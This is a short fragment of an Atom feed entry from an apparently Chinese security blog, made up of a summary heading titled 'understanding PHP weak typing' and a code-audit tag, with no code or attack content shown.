</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00__u7406_u89E3php_u5F31_u7C7B_u578B"><a href="#0x00__u7406_u89E3php_u5F31_u7C7B_u578B" class="headerlink" title="0x00 理解php弱类型"><]]>
    </summary>
    
      <category term="代码审计" scheme="http://www.freev.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
